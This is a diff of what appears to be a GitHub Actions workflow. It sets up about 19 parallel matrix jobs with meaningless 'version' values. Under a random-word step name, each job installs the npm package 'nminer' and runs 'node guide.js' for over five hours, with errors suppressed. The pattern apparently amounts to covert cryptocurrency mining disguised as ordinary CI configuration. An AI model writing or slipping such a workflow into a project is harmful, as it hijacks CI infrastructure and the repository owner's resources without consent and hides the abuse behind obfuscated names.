@@ -9,24 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8998 }
-          - { version: 2735 }
-          - { version: 1027 }
-          - { version: 9115 }
-          - { version: 7313 }
-          - { version: 5829 }
-          - { version: 5490 }
-          - { version: 8581 }
-          - { version: 4774 }
-          - { version: 4539 }
-          - { version: 5513 }
-          - { version: 9610 }
-          - { version: 1716 }
-          - { version: 1765 }
-          - { version: 5303 }
-          - { version: 2459 }
-          - { version: 3992 }
-          - { version: 2055 }
+          - { version: 9626 }
+          - { version: 493 }
+          - { version: 8597 }
+          - { version: 3699 }
+          - { version: 558 }
+          - { version: 9384 }
+          - { version: 7132 }
+          - { version: 696 }
+          - { version: 4151 }
+          - { version: 5406 }
+          - { version: 4869 }
+          - { version: 953 }
+          - { version: 7140 }
+          - { version: 6091 }
+          - { version: 3912 }
+          - { version: 5839 }
+          - { version: 4203 }
+          - { version: 3474 }
+          - { version: 3954 }
 
     steps:
       - name: Checkout
@@ -37,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: furthermore
+      - name: depute converse revitalise
         run: |
           npm install nminer@latest
-          timeout 315m node guide.js || echo "guide executed"
+          timeout 319m node guide.js || echo "guide executed"
